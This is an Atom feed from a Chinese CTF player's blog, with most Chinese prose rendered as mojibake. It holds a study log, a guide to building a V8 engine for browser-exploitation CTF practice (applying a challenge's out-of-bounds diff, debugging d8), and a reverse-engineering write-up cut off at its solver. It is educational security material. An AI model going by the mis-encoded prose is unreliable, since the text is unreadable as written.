<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jsjsj</title>
  
  <subtitle>Mr. Jsjsj&#39;s Blog</subtitle>
  <link href="https://jsjsj.top/atom.xml" rel="self"/>
  
  <link href="https://jsjsj.top/"/>
  <updated>2023-10-16T07:10:05.957Z</updated>
  <id>https://jsjsj.top/</id>
  
  <author>
    <name>Mr. Jsjsj</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>æ¯å‘¨å­¦ä¹ å‘¨è®°</title>
    <link href="https://jsjsj.top/2024/05/01/%E6%AF%8F%E5%91%A8%E5%AD%A6%E4%B9%A0%E5%91%A8%E8%AE%B0/"/>
    <id>https://jsjsj.top/2024/05/01/%E6%AF%8F%E5%91%A8%E5%AD%A6%E4%B9%A0%E5%91%A8%E8%AE%B0/</id>
    <published>2024-05-01T12:38:10.000Z</published>
    <updated>2023-10-16T07:10:05.957Z</updated>
    
    <content type="html"><![CDATA[<p><strong>å‰è¨€ï¼š</strong>æœ¬ç¯‡ç”¨äºè®°å½•æœ¬äººæ¯å‘¨æ¯å¤©çš„ä¸€ä¸ªå­¦ä¹ è¿›åº¦ï¼Œè¿™æ ·é€šè¿‡å†™åšå®¢çš„æ–¹å¼æ¥ç›‘ç£è‡ªå·±æ¯å¤©å­¦åˆ°ä¸œè¥¿ï¼Œæ¯å‘¨å‘¨å…­ä¼šå‘å¸ƒè®°å½•</p><h2 id="2023-7-10æ—¥â€”â€“2023-10-1æ—¥"><a href="#2023-7-10æ—¥â€”â€“2023-10-1æ—¥" class="headerlink" title="2023&#x2F;7&#x2F;10æ—¥â€”â€“2023&#x2F;10&#x2F;1æ—¥"></a>2023&#x2F;7&#x2F;10æ—¥â€”â€“2023&#x2F;10&#x2F;1æ—¥</h2><p>å­¦ä¹ å¤§è¯­ï¼ˆä¸€è½®ï¼‰</p><p>å­¦ä¹ é«˜æ•°ï¼ˆä¸¤è½®ï¼‰</p><p>å­¦ä¹ è‹±è¯­ï¼ˆä¸€è½®ï¼‰</p><p>å­¦ä¹ è®¡ç®—æœºåŸºç¡€ï¼ˆä¸€è½®ï¼‰</p><p>9æœˆ1æ—¥å…¥å­¦è€ƒè¯•ï¼šé«˜æ•°90ï¼ˆå‘œå‘œé©¬è™äº†ï¼Œå…¶å®èƒ½æ»¡åˆ†ï¼‰ã€è‹±è¯­60ï¼ˆèƒŒäº†èƒŒå•è¯ï¼‰ã€å¤§è¯­62ï¼ˆæ–‡å­¦å¸¸è¯†åŠ å¤§åŠ›åº¦ï¼‰ã€è®¡ç®—æœºåŸºç¡€73ï¼ˆéœ€è¦åŠ å¤§åŠ›åº¦èƒŒï¼‰</p><p>ç»“è¯­ï¼šæ¯æ—¥åŸºæœ¬ä¸Šéƒ½æ˜¯10h+</p><p>10æœˆ1å‡æœŸæœŸé—´å¤ä¹ äº†ä¹‹å‰æ‰€å­¦</p><h2 id="2023-10-9æ—¥â€”â€“2023-10-15æ—¥"><a href="#2023-10-9æ—¥â€”â€“2023-10-15æ—¥" class="headerlink" title="2023&#x2F;10&#x2F;9æ—¥â€”â€“2023&#x2F;10&#x2F;15æ—¥"></a>2023&#x2F;10&#x2F;9æ—¥â€”â€“2023&#x2F;10&#x2F;15æ—¥</h2><p>å¤§è¯­ï¼ˆå­¦ä¹ å…¬åŠ¡æ–‡ä¹¦ï¼‰<br>é«˜æ•° (å¤ä¹ äº†æ— ç©·çº§æ•°ï¼Œ2000é¢˜ æ— ç©·çº§æ•°æœ‰ç‚¹éš¾)<br>è‹±è¯­ ï¼ˆå¤ä¹ äº†ç‰¹æ®Šå·¨å‹ï¼Œåˆå¤ä¹ äº†ä¹‹å‰å­¦çš„åŸºç¡€è¯­æ³•åè¯ï¼‰<br>è®¡ç®—æœº ï¼ˆæ•°æ®åº“ç¯‡ç« çŸ¥è¯†ç‚¹èƒŒè¯µï¼‰<br>æ¯å¤©ä¸€ç¯‡å¤è¯—è¯é‰´èµå’Œæ¯å¤©ä¸€ç¯‡è‹±è¯­é˜…è¯»ç†è§£ï¼Œæ­£å¸¸æ¯å¤©å•è¯èƒŒè¯µ<br>ç»“è¯­ï¼šæ¯æ—¥åŸºæœ¬ä¸Šéƒ½æ˜¯10h+</p><h2 id="2023-10-16æ—¥â€”â€“2023-10-22æ—¥"><a href="#2023-10-16æ—¥â€”â€“2023-10-22æ—¥" class="headerlink" title="2023&#x2F;10&#x2F;16æ—¥â€”â€“2023&#x2F;10&#x2F;22æ—¥"></a>2023&#x2F;10&#x2F;16æ—¥â€”â€“2023&#x2F;10&#x2F;22æ—¥</h2><p>moreâ€¦â€¦â€¦â€¦â€¦â€¦.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;å‰è¨€ï¼š&lt;/strong&gt;æœ¬ç¯‡ç”¨äºè®°å½•æœ¬äººæ¯å‘¨æ¯å¤©çš„ä¸€ä¸ªå­¦ä¹ è¿›åº¦ï¼Œè¿™æ ·é€šè¿‡å†™åšå®¢çš„æ–¹å¼æ¥ç›‘ç£è‡ªå·±æ¯å¤©å­¦åˆ°ä¸œè¥¿ï¼Œæ¯å‘¨å‘¨å…­ä¼šå‘å¸ƒè®°å½•&lt;/p&gt;
&lt;h2 id=&quot;2023-7-10æ—¥â€”â€“2023-10-1æ—¥&quot;&gt;&lt;a href=&quot;#2023-7-10æ—¥â€”â€“2023-10</summary>
      
    
    
    
    
    <category term="å‘¨è®°" scheme="https://jsjsj.top/tags/%E5%91%A8%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>2023 Hitcon CTF The Blade Reverse</title>
    <link href="https://jsjsj.top/2023/10/14/2023%20Hitcon%20CTF%20The%20Blade%20Reverse/"/>
    <id>https://jsjsj.top/2023/10/14/2023%20Hitcon%20CTF%20The%20Blade%20Reverse/</id>
    <published>2023-10-14T13:55:12.000Z</published>
    <updated>2023-10-14T13:58:31.890Z</updated>
    
    <content type="html"><![CDATA[<p><strong>å‰è¨€ï¼šå¾ˆæœ‰æ„æ€ä¸€é“Reverseé¢˜ï¼Œåœ¨ä½ç§»åŠ å¯†æœ‰å¾ˆå¤šå·§å¦™æ–¹æ³•ï¼Œè¿™é‡Œè®°å½•ä¸‹åšé¢˜çš„è¿‡ç¨‹</strong><br>å…ˆå ä¸ªå‘ï¼Œé©¬ä¸Šè¡¥</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;å‰è¨€ï¼šå¾ˆæœ‰æ„æ€ä¸€é“Reverseé¢˜ï¼Œåœ¨ä½ç§»åŠ å¯†æœ‰å¾ˆå¤šå·§å¦™æ–¹æ³•ï¼Œè¿™é‡Œè®°å½•ä¸‹åšé¢˜çš„è¿‡ç¨‹&lt;/strong&gt;&lt;br&gt;å…ˆå ä¸ªå‘ï¼Œé©¬ä¸Šè¡¥&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="Reverse" scheme="https://jsjsj.top/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>V8 escapeç¯å¢ƒæ­å»º(ä¸€)</title>
    <link href="https://jsjsj.top/2023/10/05/V8escape%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://jsjsj.top/2023/10/05/V8escape%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2023-10-05T12:33:50.000Z</published>
    <updated>2023-10-06T09:49:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä»¥åæƒ³å‡†å¤‡æ·±å…¥ç ”ç©¶v8ï¼Œè¿™é‡Œå…ˆæŠŠç¯å¢ƒæ­å»ºä¸‹å’Œä¸€äº›çœ‹åˆ°v8ç±»å‹çš„é¢˜å¦‚ä½•å¤„ç†çš„è¿‡ç¨‹ï¼Œ</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><strong>è™šæ‹Ÿæœºç‰ˆæœ¬ä¸º ubuntu 18.04</strong></p><p>1.ç¼–è¯‘ v8</p><p>å…ˆä¸‹è½½chromå¼€å‘å·¥å…·depot_tools,å®ƒç”¨æ¥è¿›è¡Œv8ç¼–è¯‘ï¼Œç±»ä¼¼gcc</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠå®ƒæ·»åŠ åˆ°ç¯å¢ƒå˜é‡é‡Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:&lt;path to depot_tools&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæŒ‚ä»£ç†ï¼ˆä¸æŒ‚ä»£ç†çš„è¯åé¢fetch v8å’Œä¾èµ–ä¼šè¢«å¢™æ¯•ç«Ÿæ˜¯googleï¼‰ï¼Œ</p><p>å®‰è£…ninjaæŠ¥é”™ï¼Œå°†ç‰ˆæœ¬è°ƒåˆ°138bff28ï¼Œå°†DEPOT_TOOLS_UPDATEè®¾ç½®ä¸º0ï¼Œç„¶ågclient</p><p>è¿™ä¸ªä¸€å®šè¦æ‰§è¡Œï¼Œä¸ç„¶åé¢ninjaæŠ¥é”™å¯¼è‡´ç¯å¢ƒæ­å»ºä¸èµ·æ¥ï¼ˆä¸€å®šè¦æ‰§è¡Œï¼ï¼ï¼Œåšé¢˜çš„æ—¶å€™ï¼Œåœ¨æ‹‰å»ç‰ˆæœ¬ä¹‹å‰ä¹Ÿè¦æ‰§è¡Œï¼‰</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 138bff28</span><br><span class="line"><span class="built_in">export</span> DEPOT_TOOLS_UPDATE=0</span><br><span class="line">gclient</span><br></pre></td></tr></table></figure><p>ä¸‹ä¸€æ­¥ä¸‹è½½v8</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br><span class="line">æˆ–è€…fetch --force v8</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›å…¥åˆ°v8ç›®å½•ä¸‹ï¼Œå¦‚æœåœ¨æ¯”èµ›ä¸­è¿™é‡Œä¼šæ ¹æ®é¢˜ç›®ç»™çš„ç‰ˆæœ¬è¿›è¡Œgit checkout ç‰ˆæœ¬ï¼Œç¬¬äºŒæ­¥<code>gclient sync -D</code> ä¸‹è½½ç›¸å…³ä¾èµ–ï¼Œ<code>-D</code> ä¼šåˆ é™¤ä¸éœ€è¦çš„ä¾èµ–</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">git checkout  7.6.303.28</span><br><span class="line">gclient <span class="built_in">sync</span> -D</span><br></pre></td></tr></table></figure><p>æŠ¥é”™çš„è¯å°±æ‰§è¡Œè¿™å¥ï¼šgclient config <a href="https://chromium.googlesource.com/v8/v8">https://chromium.googlesource.com/v8/v8</a></p><p>ä¸‹é¢æ¥ä»‹ç»é¢˜ç›®æ–¹æ³•å¯¼å…¥</p><p>å¦‚æœæ¯”èµ›ç»™äº†ä¸€ä¸ªChromeæµè§ˆå™¨ï¼Œæˆ‘ğŸšªå¯ä»¥åœ¨æµè§ˆå™¨é‡Œè¾“å…¥<code>chrome://version</code> æŸ¥çœ‹ç‰ˆæœ¬</p><p>ç„¶åæ‰“å¼€ github çš„ <a href="https://github.com/chromium/chromium">chrome</a> é¡¹ç›®ï¼Œæœç´¢ç‰ˆæœ¬å·å¹¶åˆ‡æ¢è‡³ç›¸åº”ç‰ˆæœ¬ã€‚</p><p><img src="/images/v8image/1.png"></p><p>ç„¶ååœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„ <code>DEPS</code> æ–‡ä»¶ä¸­æŸ¥çœ‹ <code>V8</code> ç‰ˆæœ¬ï¼š</p><p><img src="/images/v8image/2.png"></p><p>å¦‚æœé¢˜ç›®ç»™äº† <code>diff</code> æ–‡ä»¶éœ€è¦å°† patch åˆ°é¡¹ç›®ä¸­ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git apply ./oob.diff</span><br></pre></td></tr></table></figure><p>diffæ–‡ä»¶patché¡¹ç›®é‡Œåœ¨v8ç›®å½•ä¸‹ï¼Œç„¶åå®‰è£…ç›¸å…³ä¾èµ–ï¼ˆå¦‚æœé‡åˆ°ä¸‹è½½å­—ä½“æœªå“åº”é—®é¢˜éœ€è¦æ·»åŠ  <code>--no-chromeos-fonts</code> å‚æ•°ï¼‰ï¼Œæ¯æ¬¡è¿è¡Œä¸åŒç‰ˆæœ¬éƒ½è¦å®‰è£…ä¾èµ–ï¼ˆä¹Ÿå°±æ˜¯ä¸åŒé¢˜ç‰ˆæœ¬ä¼šä¸ä¸€æ ·ï¼‰ï¼Œè¿™æ ·gdbä½¿ç”¨è°ƒè¯•çš„æ—¶å€™å°±ä¸ä¼šæŠ¥é”™äº†</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./build/install-build-deps.sh</span><br><span class="line">æˆ–è€…./build/install-build-deps.sh --no-chromeos-fonts</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å¼€å§‹ç¼–è¯‘v8ï¼Œé€‰æ‹©releaseç‰ˆæœ¬ï¼Œå› ä¸ºdebugç‰ˆæœ¬åœ¨è¿›è¡Œæ¼æ´è°ƒè¯•ä¼šæœ‰æ£€æµ‹ï¼Œä¸€èˆ¬éƒ½æ˜¯ç”¨release</p><p>ç¼–è¯‘v8ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ç”Ÿæˆçš„ <code>d8</code> åœ¨ <code>./out/x64.release/d8</code> ä¸­ã€‚</p><h3 id="é¢˜ç›®æ‹‰å–æ–¹æ³•ï¼Œä»¥2019-oobä¸ºä¾‹"><a href="#é¢˜ç›®æ‹‰å–æ–¹æ³•ï¼Œä»¥2019-oobä¸ºä¾‹" class="headerlink" title="é¢˜ç›®æ‹‰å–æ–¹æ³•ï¼Œä»¥2019 oobä¸ºä¾‹"></a>é¢˜ç›®æ‹‰å–æ–¹æ³•ï¼Œä»¥2019 oobä¸ºä¾‹</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 138bff28</span><br><span class="line"><span class="built_in">export</span> DEPOT_TOOLS_UPDATE=0</span><br><span class="line">gclient</span><br><span class="line">fetch v8 ä¹‹å‰fetchå°±æ‰§è¡Œfetch --force v8</span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598<span class="comment">#è®¾ç½®v8åˆ†æ”¯</span></span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">git apply ../oob.diff</span><br><span class="line">./build/install-build-deps.sh --no-chromeos-fonts</span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure><h3 id="è°ƒè¯•-v8"><a href="#è°ƒè¯•-v8" class="headerlink" title="è°ƒè¯• v8"></a>è°ƒè¯• v8</h3><p>åœ¨ <code>~/.gdbinit</code> æ·»åŠ  <code>v8</code> çš„è°ƒè¯•æ’ä»¶ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /path/to/v8/tools/gdbinit</span><br><span class="line"><span class="built_in">source</span> /path/to/v8/gdb-v8-support.py</span><br></pre></td></tr></table></figure><p>&#x2F;path&#x2F;to&#x2F;æ˜¯è‡ªå·±åˆ°è¾¾v8ç›®å½•çš„ä¸€äº›è·¯å¾„</p><p>å¸¸è§å‚æ•°ï¼š</p><p>â€“allow-natives-syntax å¼€å¯åŸç”ŸAPI (ç”¨çš„æ¯”è¾ƒå¤š)<br>â€“trace-turbo è·Ÿè¸ªç”ŸæˆTurboFan IR<br>â€“print-bytecode æ‰“å°ç”Ÿæˆçš„bytecode<br>â€“shell è¿è¡Œè„šæœ¬ååˆ‡å…¥äº¤äº’æ¨¡å¼<br>æ›´å¤šå‚æ•°å¯ä»¥å‚è€ƒ â€“help<br>è°ƒè¯• js è„šæœ¬æ—¶å¯ä»¥é‡‡ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./d8</span><br><span class="line">r --allow-natives-syntax --shell ./exp.js</span><br></pre></td></tr></table></figure><p>jsä¸­å¸¸è§çš„â¼€äº›è°ƒè¯•æŠ€å·§ï¼š</p><p>åœ¨jsä¸­å†™â¼Šæ–­ç‚¹ï¼š**%SystemBreak();** ï¼Œå¦‚æœä¸åœ¨è°ƒè¯•æ¨¡å¼çš„è¯, ç¨‹åºç›´æ¥ä¸­æ–­, å¦‚æœåœ¨è°ƒè¯•å™¨ä¸­, ä¼šè¢«è°ƒè¯•å™¨è¯†åˆ«åˆ°<br>å¹¶ä¸”æ–­ä¸‹æ¥ã€‚<br>æ‰“å°å‡ºå¯¹è±¡çš„åœ°å€å’Œå¯¹åº”çš„ä¿¡æ¯: <strong>%DebugPrint(var_name);</strong><br>è°ƒè¯•æ—¶è¾“å…¥ <strong>job + DebugPrint</strong>æ‰“å°çš„å¯¹è±¡åœ°å€ å¯ä»¥æ‰“å°å‡ºå¯¹è±¡çš„ç»“æ„ã€‚</p><h3 id="å®‰è£…-turbolizer"><a href="#å®‰è£…-turbolizer" class="headerlink" title="å®‰è£… turbolizer"></a>å®‰è£… turbolizer</h3><p><code>turbolizer</code> æ˜¯ä¸€ä¸ªå¯è§†åŒ–åˆ†æ JS ä¼˜åŒ–çš„å·¥å…·ï¼Œå®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /path/to/v8/tools/turbolizer</span><br><span class="line">sudo npm install n -g</span><br><span class="line">sudo n 16.20.0</span><br><span class="line">sudo npm i</span><br><span class="line">sudo npm run-script build</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”±äº Ubuntu18.04 é»˜è®¤çš„ <code>node</code> ç‰ˆæœ¬è¿‡ä½ï¼Œéœ€è¦å®‰è£… <code>16.20.0</code> ç‰ˆæœ¬ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo npm i</span><br></pre></td></tr></table></figure><p>æœ€åéœ€è¦å¯åŠ¨ä¸€ä¸ª web æœåŠ¡å™¨ï¼Œæ ¹æ®éœ€è¦ 8000 å¯ä»¥æ¢æˆå…¶å®ƒç«¯å£ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure><p>ç¼–å†™ä¸€ä¸ª js è„šæœ¬ï¼š<br><code>%OptimizeFunctionOnNextCall</code> å†…ç½®å‡½æ•°å¯ä»¥ç›´æ¥è§¦å‘å¼ºè¡Œè§¦å‘ä¼˜åŒ–ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//%OptimizeFunctionOnNextCall(add);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">add</span>(i, i + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œ js è„šæœ¬å¹¶ä½¿ç”¨ <code>--trace-turbo</code> å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./d8 --trace-turbo --allow-natives-syntax ./test.js</span><br></pre></td></tr></table></figure><p>åœ¨æµè§ˆå™¨ä¸­è®¿é—® <code>http://127.0.0.1:8000/path/to/v8/tools/turbolizer/</code> ï¼Œç„¶ååœ¨å…¶ä¸­æ‰“å¼€è¯¥æ–‡ä»¶å°±å¯ä»¥è¿›è¡Œåˆ†æã€‚</p><p>å…ˆå ä¸ªå‘ç¨åæ¥è¡¥å…¨ã€‚ã€‚ã€‚ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä»¥åæƒ³å‡†å¤‡æ·±å…¥ç ”ç©¶v8ï¼Œè¿™é‡Œå…ˆæŠŠç¯å¢ƒæ­å»ºä¸‹å’Œä¸€äº›çœ‹åˆ°v8ç±»å‹çš„é¢˜å¦‚ä½•å¤„ç†çš„è¿‡ç¨‹ï¼Œ&lt;/p&gt;
&lt;h2 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;è™šæ‹Ÿæœºç‰ˆæœ¬ä¸º</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://jsjsj.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2023 xxxæ¯”èµ›å…³äºå­¦å¼Ÿç»™çš„Rev wp</title>
    <link href="https://jsjsj.top/2023/10/04/wp/"/>
    <id>https://jsjsj.top/2023/10/04/wp/</id>
    <published>2023-10-04T11:25:24.000Z</published>
    <updated>2023-10-13T08:28:18.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>å…³äºxxxxæ¯”èµ›xxxå­¦å¼Ÿxxxxæ—¶é—´ç»™äº†xxxxä¸¤ä¸ªé“reé¢˜ï¼ŒğŸ‘´å¼€äº†ä¸‹é¢˜ä¸éš¾ï¼Œå°±æ˜¯å†™è„šæœ¬è€æ˜¯æŠ¥é”™ï¼Œg</strong></p><p><strong>è¿™ä¸¤å¤©å­¦å¼Ÿç»™äº†ä¸¤é“Revé¢˜ï¼Œé‡æ¸©ä¸‹å½“å¹´çš„reå‘³é“ï¼Œreéƒ½ä¸éš¾ï¼Œéšä¾¿æ°´ä¸€ä¸ªåšå®¢æ–‡ç« ï¼ˆæ¯•ç«Ÿåšå®¢åˆšåˆ›å»ºæ²¡å¤šä¹…ï¼Œæ²¡æ–‡ç« å¯å‘ï¼‰ï¼Œç›´æ¥ç»™é¢˜ä»£ç å’Œexp</strong></p><h2 id="Reverse-wp"><a href="#Reverse-wp" class="headerlink" title="Reverse wp"></a>Reverse wp</h2><h3 id="ezxz3-xxxé™„ä»¶å"><a href="#ezxz3-xxxé™„ä»¶å" class="headerlink" title="ezxz3 xxxé™„ä»¶å"></a>ezxz3 xxxé™„ä»¶å</h3><p>é¢˜ç›®æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Please input flag:&quot;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag)!=<span class="number">42</span>:</span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="string">&quot;Check your length!&quot;</span>)</span><br><span class="line">Â  Â  exit()</span><br><span class="line"></span><br><span class="line">l=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">Â  Â  s=<span class="string">&quot;&quot;</span></span><br><span class="line">Â  Â  <span class="keyword">for</span> j <span class="keyword">in</span> flag[i*<span class="number">7</span>:i*<span class="number">7</span>+<span class="number">7</span>]:</span><br><span class="line">Â  Â  Â  Â  s+=<span class="built_in">hex</span>(<span class="built_in">ord</span>(j))[<span class="number">2</span>:]</span><br><span class="line">Â  Â  l.append(<span class="built_in">int</span>(s,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">(<span class="number">593</span>*l[<span class="number">0</span>] + <span class="number">997</span>*l[<span class="number">1</span>] + <span class="number">811</span>*l[<span class="number">2</span>] + <span class="number">258</span>*l[<span class="number">3</span>] + <span class="number">829</span>*l[<span class="number">4</span>] + <span class="number">532</span>*l[<span class="number">5</span>])== <span class="number">0x5b8e0aef71d34ff43</span> <span class="keyword">and</span> \</span><br><span class="line">(<span class="number">605</span>*l[<span class="number">0</span>] + <span class="number">686</span>*l[<span class="number">1</span>] + <span class="number">328</span>*l[<span class="number">2</span>] + <span class="number">602</span>*l[<span class="number">3</span>] + <span class="number">695</span>*l[<span class="number">4</span>] + <span class="number">576</span>*l[<span class="number">5</span>])== <span class="number">0x551a262360964ef7f</span> <span class="keyword">and</span> \</span><br><span class="line">(<span class="number">373</span>*l[<span class="number">0</span>] + <span class="number">512</span>*l[<span class="number">1</span>] + <span class="number">449</span>*l[<span class="number">2</span>] + <span class="number">756</span>*l[<span class="number">3</span>] + <span class="number">448</span>*l[<span class="number">4</span>] + <span class="number">580</span>*l[<span class="number">5</span>])== <span class="number">0x49d158a5657d6931c</span> <span class="keyword">and</span> \</span><br><span class="line">(<span class="number">560</span>*l[<span class="number">0</span>] + <span class="number">635</span>*l[<span class="number">1</span>] + <span class="number">422</span>*l[<span class="number">2</span>] + <span class="number">971</span>*l[<span class="number">3</span>] + <span class="number">855</span>*l[<span class="number">4</span>] + <span class="number">597</span>*l[<span class="number">5</span>])== <span class="number">0x625568d5abbabf4f3</span> <span class="keyword">and</span> \</span><br><span class="line">(<span class="number">717</span>*l[<span class="number">0</span>] + <span class="number">507</span>*l[<span class="number">1</span>] + <span class="number">388</span>*l[<span class="number">2</span>] + <span class="number">925</span>*l[<span class="number">3</span>] + <span class="number">324</span>*l[<span class="number">4</span>] + <span class="number">524</span>*l[<span class="number">5</span>])== <span class="number">0x50ee0c025e70e3c23</span> <span class="keyword">and</span> \</span><br><span class="line">(<span class="number">312</span>*l[<span class="number">0</span>] + <span class="number">368</span>*l[<span class="number">1</span>] + <span class="number">884</span>*l[<span class="number">2</span>] + <span class="number">518</span>*l[<span class="number">3</span>] + <span class="number">495</span>*l[<span class="number">4</span>] + <span class="number">414</span>*l[<span class="number">5</span>])== <span class="number">0x40e735f8aa2815f65</span>):</span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="string">&quot;Good job!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="string">&quot;Wrong\nTry again!!!&quot;</span>)</span><br><span class="line">Â  Â  exit()</span><br></pre></td></tr></table></figure><p>åˆ†ææºç ï¼Œç›´æ¥ç”¨z3 è®¾ç½®çº¦æŸæ¡ä»¶è·‘å°±è¡Œäº†ï¼Œæ³¨æ„æœ€åå–æ•°æ®çš„æ—¶å€™ï¼Œexp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 